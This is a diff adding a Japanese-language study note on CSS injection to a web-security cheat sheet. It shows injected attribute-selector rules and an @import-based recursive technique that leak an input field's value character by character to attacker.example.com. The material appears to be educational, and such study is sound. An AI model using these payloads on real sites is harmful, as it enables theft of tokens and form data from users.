@@ -69,3 +69,55 @@
 - ホストベースの CSP が設定されている場合は上記のような手法を検討する
   - ホストベースではない strict-dynamic/nonce/hash を使おう!
   - csv-evaluator を使おう！
+
+## CSS インジェクション
+
+CSS の前方一致セレクタおよび url 関数を利用する
+
+```css
+href[a^='https://']
+{
+  /* a属性がhttps://から始まるhref要素に適用される */
+  color: red;
+}
+
+body {
+  background: url(https://example.com/background.jpg);
+}
+```
+
+以下の CSS を注入し input 属性の value の一文字目を当てる（同様に 2 文字目以降も当てる）
+
+```css
+input[value^='a'] {
+  background: url(https://attacker.example.com?value=a);
+}
+input[value^='b'] {
+  background: url(https://attacker.example.com?value=b);
+}
+/* ... */
+```
+
+ただし以下のデメリットがある
+
+- 一度に全て取得しようとすると value が英語 3 文字だったとしても 26^3=17576 通りのルールが必要(CSS ファイルの上限に引っかかる)
+- 故に、value が長ければ長いほど複数回に分ける必要あり
+  - 訪問のたびにランダム化される要素の場合は無理
+
+対策として@import 文を使用して 1 回の訪問で再帰的に文字列を取得する方法がある
+
+まずは 1.css を読み込みつつ、1 文字目を特定する。サーバ側では 1.css のリクエストを保留し、特定された 1 文字目に応じて動的に css を生成してレスポンスする
+
+```css
+@import url(https://attacker.example.com/1.css);
+
+input[value^='a'] {
+  background: url(https://attacker.example.com/leak/a);
+}
+input[value^='b'] {
+  background: url(https://attacker.example.com/leak/b);
+}
+/* ... */
+```
+
+これを繰り返すことで再帰的に value を取得する
